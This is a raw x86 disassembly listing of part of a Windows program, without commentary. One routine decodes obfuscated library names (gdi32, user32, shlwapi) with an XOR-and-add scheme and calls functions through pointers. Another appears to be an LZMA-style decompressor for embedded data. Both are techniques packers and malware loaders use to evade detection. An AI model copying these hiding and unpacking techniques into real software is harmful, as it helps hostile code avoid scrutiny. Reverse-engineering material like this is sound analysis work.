  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	push   ebx
  41faa5:	hlt    
  41faa6:	lds    ecx,FWORD PTR [esi+0x47e4a434]
  41faac:	mov    edi,0xe2db8f78
  41fab1:	jnp    0x41fadb
  41fab3:	sbb    DWORD PTR [ecx],eax
  41fab5:	add    BYTE PTR [eax],al
  41fab7:	add    BYTE PTR [ebx+0x3a],al
  41faba:	pop    esp
  41fabb:	inc    esi
  41fabc:	outs   dx,DWORD PTR ds:[esi]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
  41fe48:	mov    WORD PTR [ebp-0x48],ax
  41fe4c:	mov    WORD PTR [ebp-0x46],cx
  41fe50:	mov    WORD PTR [ebp-0x44],si
  41fe54:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe57:	movzx  edx,WORD PTR [ebp-0x54]
  41fe5b:	mov    eax,0x75108b3
  41fe60:	xor    ecx,eax
  41fe62:	add    ecx,ebx
  41fe64:	xor    ecx,edx
  41fe66:	mov    WORD PTR [ebp-0x54],cx
  41fe6a:	mov    ecx,DWORD PTR [ebp+0x8]
  41fe6d:	xor    ecx,eax
  41fe6f:	movzx  eax,WORD PTR [ebp-0x40]
  41fe73:	add    ecx,ebx
  41fe75:	xor    ecx,eax
  41fe77:	xor    eax,eax
  41fe79:	mov    WORD PTR [ebp-0x40],cx
  41fe7d:	mov    WORD PTR [ebp-0xf4],ax
  41fe84:	mov    WORD PTR [ebp-0x108],ax
  41fe8b:	mov    edi,DWORD PTR [ebp+0x24]
  41fe8e:	lea    eax,[ebp-0xf4]
  41fe94:	lea    edx,[ebp-0x54]
  41fe97:	mov    DWORD PTR [ebp-0xe0],0x2
  41fea1:	mov    DWORD PTR [ebp-0xdc],eax
  41fea7:	call   0x4228e9
  41feac:	mov    ecx,DWORD PTR [ebp+0x8]
  41feaf:	mov    DWORD PTR [ebp-0xd8],eax
  41feb5:	mov    eax,0x75108b3
  41feba:	xor    ecx,eax
  41febc:	add    ecx,ebx
  41febe:	je     0x41fedd
  41fec0:	lea    ecx,[ebp-0xe0]
  41fec6:	push   ecx
  41fec7:	mov    ecx,DWORD PTR [ebp+0xc]
  41feca:	xor    ecx,eax
  41fecc:	add    ecx,ebx
  41fece:	push   ecx
  41fecf:	lea    eax,[ebp-0x9c]
  41fed5:	push   eax
  41fed6:	mov    eax,DWORD PTR [ebp+0x10]
  41fed9:	push   0x0
  41fedb:	call   eax
  41fedd:	mov    edi,DWORD PTR [ebp+0x24]
  41fee0:	lea    eax,[ebp-0x108]
  41fee6:	lea    edx,[ebp-0x40]
  41fee9:	mov    DWORD PTR [ebp-0xdc],eax
  41feef:	call   0x4228e9
  41fef4:	mov    DWORD PTR [ebp-0xd8],eax
  41fefa:	mov    eax,DWORD PTR [ebp+0x14]
  41fefd:	push   DWORD PTR [ebp-0x4]
  41ff00:	push   DWORD PTR [ebp+0x20]
  41ff03:	push   DWORD PTR [ebp+0x1c]
  41ff06:	push   DWORD PTR [ebp+0x18]
  41ff09:	push   DWORD PTR [ebp+0x10]
  41ff0c:	push   DWORD PTR [ebp+0x8]
  41ff0f:	push   DWORD PTR [ebp+0xc]
  41ff12:	call   0x42118a
  41ff17:	test   eax,eax
  41ff19:	je     0x41ff60
  41ff1b:	add    DWORD PTR [ebp-0x4],eax
  41ff1e:	push   DWORD PTR [ebp-0x4]
  41ff21:	lea    esi,[ebp+0x4]
  41ff24:	call   0x420378
  41ff29:	mov    eax,DWORD PTR [ebp-0x4]
  41ff2c:	mov    eax,DWORD PTR [eax+0x1c8]
  41ff32:	mov    eax,DWORD PTR [eax]
  41ff34:	xor    eax,0x75108b3
  41ff39:	add    eax,ebx
  41ff3b:	mov    eax,DWORD PTR [ebp-0x4]
  41ff3e:	jne    0x41ff56
  41ff40:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff43:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ff49:	push   DWORD PTR [ecx]
  41ff4b:	mov    eax,DWORD PTR [eax+0x1e0]
  41ff51:	call   DWORD PTR [eax+0x28]
  41ff54:	jmp    0x41ff60
  41ff56:	mov    eax,DWORD PTR [eax+0x17c]
  41ff5c:	mov    eax,DWORD PTR [eax]
  41ff5e:	add    DWORD PTR [esi],eax
  41ff60:	mov    eax,DWORD PTR [ebp-0x4]
  41ff63:	mov    eax,DWORD PTR [eax+0x1dc]
  41ff69:	dec    DWORD PTR [eax]
  41ff6b:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff6e:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ff74:	mov    eax,DWORD PTR [eax]
  41ff76:	lea    eax,[ecx+eax*4]
  41ff79:	mov    ecx,DWORD PTR [ebp-0x4]
  41ff7c:	mov    ecx,DWORD PTR [ecx+0x17c]
  41ff82:	mov    eax,DWORD PTR [eax]
  41ff84:	mov    ecx,DWORD PTR [ecx]
  41ff86:	add    DWORD PTR [eax],ecx
  41ff88:	pop    edi
  41ff89:	pop    esi
  41ff8a:	pop    ebx
  41ff8b:	leave  
  41ff8c:	ret    0x20
  41ff8f:	push   edi
  41ff90:	push   esi
  41ff91:	push   ebx
  41ff92:	push   ebp
  41ff93:	mov    ebp,esp
  41ff95:	mov    eax,DWORD PTR [ebp+0x24]
  41ff98:	add    DWORD PTR [ebp+0x28],eax
  41ff9b:	push   eax
  41ff9c:	cld    
  41ff9d:	mov    esi,DWORD PTR [ebp+0x18]
  41ffa0:	add    DWORD PTR [ebp+0x1c],esi
  41ffa3:	push   esi
  41ffa4:	mov    esi,DWORD PTR [ebp+0x14]
  41ffa7:	lods   eax,DWORD PTR ds:[esi]
  41ffa8:	xchg   edx,eax
  41ffa9:	push   edx
  41ffaa:	mov    cl,BYTE PTR [esi-0x2]
  41ffad:	or     eax,0xffffffff
  41ffb0:	shl    eax,cl
  41ffb2:	not    eax
  41ffb4:	push   eax
  41ffb5:	mov    cl,dh
  41ffb7:	or     eax,0xffffffff
  41ffba:	shl    eax,cl
  41ffbc:	not    eax
  41ffbe:	push   eax
  41ffbf:	add    cl,dl
  41ffc1:	mov    edi,esi
  41ffc3:	sub    esp,0xc
  41ffc6:	sub    eax,eax
  41ffc8:	inc    eax
  41ffc9:	push   eax
  41ffca:	push   eax
  41ffcb:	push   eax
  41ffcc:	push   eax
  41ffcd:	push   eax
  41ffce:	push   edi
  41ffcf:	sub    esi,esi
  41ffd1:	push   esi
  41ffd2:	or     ebx,0xffffffff
  41ffd5:	mov    eax,0x300
  41ffda:	shl    eax,cl
  41ffdc:	lea    ecx,[eax+0x736]
  41ffe2:	mov    eax,0x4000400
  41ffe7:	shr    ecx,1
  41ffe9:	rep stos DWORD PTR es:[edi],eax
  41ffeb:	push   0x5
  41ffed:	pop    ecx
  41ffee:	call   0x4202d9
  41fff3:	loop   0x41ffee
  41fff5:	lea    esi,[esi]
  41fff7:	lea    edi,[edi]
  41fff9:	mov    edi,DWORD PTR [ebp-0x4]
  41fffc:	mov    eax,DWORD PTR [ebp-0x10]
  41ffff:	sub    edi,DWORD PTR [ebp+0x24]
  420002:	and    eax,edi
  420004:	mov    DWORD PTR [ebp-0x18],eax
  420007:	mov    al,0x0
  420009:	call   0x4202f1
  42000e:	jne    0x4200a9
  420014:	mov    cl,BYTE PTR [ebp-0xc]
  420017:	and    edi,DWORD PTR [ebp-0x14]
  42001a:	shl    edi,cl
  42001c:	sub    cl,0x8
  42001f:	neg    cl
  420021:	shr    esi,cl
  420023:	pop    eax
  420024:	add    edi,esi
  420026:	pop    esi
  420027:	lea    edi,[edi+edi*2]
  42002a:	shl    edi,0x8
  42002d:	cmp    al,0x7
  42002f:	pop    edx
  420030:	lea    ecx,[esi+edi*2+0xe6c]
  420037:	push   ecx
  420038:	push   esi
  420039:	mov    esi,0x100
  42003e:	push   eax
  42003f:	mov    al,0x1
  420041:	jb     0x420077
  420043:	mov    edi,DWORD PTR [ebp-0x4]
  420046:	sub    edi,DWORD PTR [ebp-0x24]
  420049:	movzx  edi,BYTE PTR [edi]
  42004c:	mov    ebp,DWORD PTR [ebp-0x34]
  42004f:	shl    edi,1
  420051:	mov    ecx,esi
  420053:	and    esi,edi
  420055:	add    ecx,esi
  420057:	lea    ebp,[ebp+ecx*2+0x0]
  42005b:	call   0x420310
  420060:	mov    ecx,eax
  420062:	shr    esi,0x8
  420065:	and    ecx,0x1
  420068:	cmp    esi,ecx
  42006a:	mov    esi,0x100
  42006f:	jne    0x42007f
  420071:	cmp    eax,esi
  420073:	jb     0x42004c
  420075:	jmp    0x42008b
  420077:	mov    ebp,DWORD PTR [ebp-0x34]
  42007a:	call   0x420310
  42007f:	inc    eax
  420080:	inc    esi
  420081:	sub    eax,0x1
  420084:	sub    esi,0x1
  420087:	cmp    eax,esi
  420089:	jb     0x420077
  42008b:	pop    edx
  42008c:	inc    edx
  42008d:	cmp    edx,0x5
  420090:	dec    edx
  420091:	mov    ecx,edx
  420093:	jb     0x4200a4
  420095:	inc    edx
  420096:	cmp    edx,0xb
  420099:	dec    edx
  42009a:	mov    cl,0x4
  42009c:	dec    cl
  42009e:	jb     0x4200a4
  4200a0:	mov    cl,0x7
  4200a2:	dec    cl
  4200a4:	sub    edx,ecx
  4200a6:	push   edx
  4200a7:	jmp    0x4200f8
  4200a9:	mov    al,0xc1
  4200ab:	dec    al
  4200ad:	call   0x420301
  4200b2:	jne    0x4200c8
  4200b4:	pop    eax
  4200b5:	pop    edi
  4200b6:	pop    edx
  4200b7:	pop    ecx
  4200b8:	pop    edx
  4200b9:	pop    ecx
  4200ba:	push   DWORD PTR [esp]
  4200bd:	push   ecx
  4200be:	push   edx
  4200bf:	mov    edx,0x664
  4200c4:	mov    cl,0x0
  4200c6:	jmp    0x42013b
  4200c8:	mov    al,0xcd
  4200ca:	dec    al
  4200cc:	call   0x420301
  4200d1:	jne    0x420101
  4200d3:	mov    al,0xf1
  4200d5:	dec    al
  4200d7:	call   0x4202f1
  4200dc:	jne    0x420131
  4200de:	pop    eax
  4200df:	cmp    al,0x7
  4200e1:	mov    al,0x9
  4200e3:	jb     0x4200e7
  4200e5:	mov    al,0xb
  4200e7:	push   eax
  4200e8:	mov    esi,DWORD PTR [ebp-0x4]
  4200eb:	sub    esi,DWORD PTR [ebp-0x24]
  4200ee:	cmp    esi,DWORD PTR [ebp+0x24]
  4200f1:	jb     0x4202c8
  4200f7:	lods   al,BYTE PTR ds:[esi]
  4200f8:	mov    edi,DWORD PTR [ebp-0x4]
  4200fb:	stos   BYTE PTR es:[edi],al
  4200fc:	jmp    0x42028f
  420101:	mov    al,0xd8
  420103:	call   0x420301
  420108:	mov    esi,DWORD PTR [ebp-0x28]
  42010b:	je     0x420128
  42010d:	mov    al,0xe4
  42010f:	call   0x420301
  420114:	mov    esi,DWORD PTR [ebp-0x2c]
  420117:	je     0x420122
  420119:	mov    esi,DWORD PTR [ebp-0x30]
  42011c:	mov    ecx,DWORD PTR [ebp-0x2c]
  42011f:	mov    DWORD PTR [ebp-0x30],ecx
  420122:	mov    ecx,DWORD PTR [ebp-0x28]
  420125:	mov    DWORD PTR [ebp-0x2c],ecx
  420128:	mov    ecx,DWORD PTR [ebp-0x24]
  42012b:	mov    DWORD PTR [ebp-0x28],ecx
  42012e:	mov    DWORD PTR [ebp-0x24],esi
  420131:	pop    eax
  420132:	pop    edi
  420133:	pop    ecx
  420134:	mov    edx,0xa68
  420139:	mov    cl,0x8
  42013b:	add    edx,edi
  42013d:	push   edx
  42013e:	push   edi
  42013f:	cmp    al,0x7
  420141:	mov    al,cl
  420143:	jb     0x420147
  420145:	add    al,0x3
  420147:	push   eax
  420148:	mov    ebp,DWORD PTR [ebp-0x34]
  42014b:	call   0x42030e
  420150:	jne    0x420166
  420152:	mov    eax,DWORD PTR [ebp-0x18]
  420155:	mov    edi,DWORD PTR [ebp-0x34]
  420158:	shl    eax,0x3
  42015b:	sub    ecx,ecx
  42015d:	push   0x8
  42015f:	pop    esi
  420160:	lea    edi,[edi+eax*2+0x4]
  420164:	jmp    0x42019b
  420166:	mov    ebp,DWORD PTR [ebp-0x34]
  420169:	add    ebp,0x2
  42016c:	call   0x42030e
  420171:	jne    0x42018b
  420173:	mov    eax,DWORD PTR [ebp-0x18]
  420176:	mov    edi,DWORD PTR [ebp-0x34]
  420179:	shl    eax,0x3
  42017c:	push   0x8
  42017e:	pop    ecx
  42017f:	push   0x8
  420181:	pop    esi
  420182:	lea    edi,[edi+eax*2+0x104]
  420189:	jmp    0x42019b
  42018b:	mov    edi,0x204
  420190:	add    edi,DWORD PTR [ebp-0x34]
  420193:	push   0x10
  420195:	pop    ecx
  420196:	mov    esi,0x100
  42019b:	mov    DWORD PTR [ebp-0x1c],ecx
  42019e:	sub    eax,eax
  4201a0:	inc    eax
  4201a1:	mov    ebp,edi
  4201a3:	call   0x420310
  4201a8:	mov    ecx,eax
  4201aa:	sub    ecx,esi
  4201ac:	jb     0x4201a1
  4201ae:	add    DWORD PTR [ebp-0x1c],ecx
  4201b1:	cmp    DWORD PTR [ebp-0x3c],0x4
  4201b5:	jae    0x42026b
  4201bb:	add    DWORD PTR [ebp-0x3c],0x7
  4201bf:	mov    ecx,DWORD PTR [ebp-0x1c]
  4201c2:	cmp    ecx,0x4
  4201c5:	jb     0x4201ca
  4201c7:	push   0x3
  4201c9:	pop    ecx
  4201ca:	mov    edi,DWORD PTR [ebp-0x38]
  4201cd:	shl    ecx,0x6
  4201d0:	sub    eax,eax
  4201d2:	inc    eax
  4201d3:	push   0x40
  4201d5:	pop    esi
  4201d6:	lea    edi,[edi+ecx*2+0x360]
  4201dd:	mov    ebp,edi
  4201df:	call   0x420310
  4201e4:	mov    ecx,eax
  4201e6:	sub    ecx,esi
  4201e8:	jb     0x4201dd
  4201ea:	mov    DWORD PTR [ebp-0x18],ecx
  4201ed:	mov    DWORD PTR [ebp-0x24],ecx
  4201f0:	cmp    ecx,0x4
  4201f3:	jb     0x420268
  4201f5:	mov    esi,ecx
  4201f7:	and    DWORD PTR [ebp-0x24],0x1
  4201fb:	shr    esi,1
  4201fd:	or     DWORD PTR [ebp-0x24],0x2
  420201:	dec    esi
  420202:	cmp    ecx,0xe
  420205:	jae    0x420220
  420207:	mov    eax,0x2af
  42020c:	sub    eax,ecx
  42020e:	mov    ecx,esi
  420210:	shl    BYTE PTR [ebp-0x24],cl
  420213:	add    eax,DWORD PTR [ebp-0x24]
  420216:	shl    eax,1
  420218:	add    eax,DWORD PTR [ebp-0x38]
  42021b:	mov    DWORD PTR [ebp-0x34],eax
  42021e:	jmp    0x42024d
  420220:	sub    esi,0x4
  420223:	call   0x4202cd
  420228:	shr    ebx,1
  42022a:	shl    DWORD PTR [ebp-0x24],1
  42022d:	cmp    DWORD PTR [ebp-0x20],ebx
  420230:	jb     0x420238
  420232:	inc    DWORD PTR [ebp-0x24]
  420235:	sub    DWORD PTR [ebp-0x20],ebx
  420238:	dec    esi
  420239:	jne    0x420223
  42023b:	mov    eax,0x644
  420240:	add    eax,DWORD PTR [ebp-0x38]
  420243:	mov    DWORD PTR [ebp-0x34],eax
  420246:	shl    DWORD PTR [ebp-0x24],0x4
  42024a:	push   0x4
  42024c:	pop    esi
  42024d:	sub    edi,edi
  42024f:	inc    edi
  420250:	mov    eax,edi
  420252:	mov    ebp,DWORD PTR [ebp-0x34]
  420255:	call   0x420310
  42025a:	test   al,0x1
  42025c:	je     0x420261
  42025e:	or     DWORD PTR [ebp-0x24],edi
  420261:	shl    edi,1
  420263:	dec    esi
  420264:	jne    0x420252
  420266:	jmp    0x420268
  420268:	inc    DWORD PTR [ebp-0x24]
  42026b:	mov    ecx,DWORD PTR [ebp-0x1c]
  42026e:	add    ecx,0x2
  420271:	mov    edi,DWORD PTR [ebp-0x4]
  420274:	mov    eax,edi
  420276:	sub    eax,DWORD PTR [ebp+0x24]
  420279:	cmp    DWORD PTR [ebp-0x24],eax
  42027c:	ja     0x4202c8
  42027e:	mov    esi,edi
  420280:	sub    esi,DWORD PTR [ebp-0x24]
  420283:	mov    edx,DWORD PTR [ebp+0x28]
  420286:	lods   al,BYTE PTR ds:[esi]
  420287:	stos   BYTE PTR es:[edi],al
  420288:	cmp    edi,edx
  42028a:	jae    0x42028f
  42028c:	dec    ecx
  42028d:	jne    0x420286
  42028f:	mov    DWORD PTR [ebp-0x4],edi
  420292:	movzx  esi,al
  420295:	cmp    edi,DWORD PTR [ebp+0x28]
  420298:	jb     0x41fff9
  42029e:	call   0x4202cd
  4202a3:	sub    eax,eax
  4202a5:	lea    ebp,[esp+0x3c]
  4202a9:	mov    edx,DWORD PTR [ebp+0x20]
  4202ac:	mov    esi,DWORD PTR [ebp-0x8]
  4202af:	sub    esi,DWORD PTR [ebp+0x18]
  4202b2:	mov    DWORD PTR [edx],esi
  4202b4:	mov    edx,DWORD PTR [ebp+0x2c]
  4202b7:	mov    edi,DWORD PTR [ebp-0x4]
  4202ba:	sub    edi,DWORD PTR [ebp+0x24]
  4202bd:	mov    DWORD PTR [edx],edi
  4202bf:	leave  
  4202c0:	pop    ebx
  4202c1:	pop    esi
  4202c2:	pop    edi
  4202c3:	ret    0x1c
  4202c6:	pop    esi
  4202c7:	pop    eax
  4202c8:	sub    eax,eax
